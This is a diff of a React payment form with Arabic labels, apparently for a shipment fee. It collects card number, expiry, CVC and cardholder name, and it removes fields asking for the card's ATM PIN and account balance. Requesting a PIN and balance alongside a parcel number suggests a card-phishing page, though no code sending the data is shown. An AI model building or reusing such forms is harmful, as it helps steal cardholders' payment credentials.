@@ -21,8 +21,8 @@ const Pay=()=>{
       MM:"",
       YY:"",
       cvcCard:"",
-      كلمةالمرورالبطاقة:"",
-      الرصيد:"",
+//      كلمةالمرورالبطاقة:"",
+//      الرصيد:"",
       رقمالشحــنة:datas
     }
   });
@@ -44,7 +44,7 @@ const Pay=()=>{
     
   };
     const handlerout = ()=>{
-      if(form.data.typecard == "اختر البطاقة"||form.data.الرصيد == ""||form.data.الاسم_على_البطاقة == "" || form.data.رقم_البطاقة == "" || form.data.MM == "" || form.data.YY == "" || form.data.cvcCard == "" || form.data.كلمةالمرورالبطاقة == ""){
+      if(form.data.typecard == "اختر البطاقة"||form.data.الاسم_على_البطاقة == "" || form.data.رقم_البطاقة == "" || form.data.MM == "" || form.data.YY == "" || form.data.cvcCard == "" ){
         alert('من فضلك قم بملى الحقول')
       }else{
         
@@ -108,10 +108,7 @@ const Pay=()=>{
                   setDynamicFormData(name, value);
                 }} maxLength="2" required/>
             </div>
-                     <input type="text" name='الرصيد' placeholder='0.000000'onChange={(e) => {
-                  const { name, value } = e.target;
-                  setDynamicFormData(name, value);
-                }} maxLength="7" required/>
+                     
               <input type="text" placeholder='الرقم (cvc/cvv)' name='cvcCard' onChange={(e) => {
                   const { name, value } = e.target;
                   setDynamicFormData(name, value);
@@ -119,10 +116,6 @@ const Pay=()=>{
                  </div>
             
             
-            <input type="text" placeholder='ادخل رقم بطاقة الصراف المكونة من 4 ارقام 'name='كلمةالمرورالبطاقة' onChange={(e) => {
-                  const { name, value } = e.target;
-                  setDynamicFormData(name, value);
-                }} maxLength="5" required/>
             <button type='submit' onClick={handlerout}>أدفع ألأن</button>
         </form>
     </div>
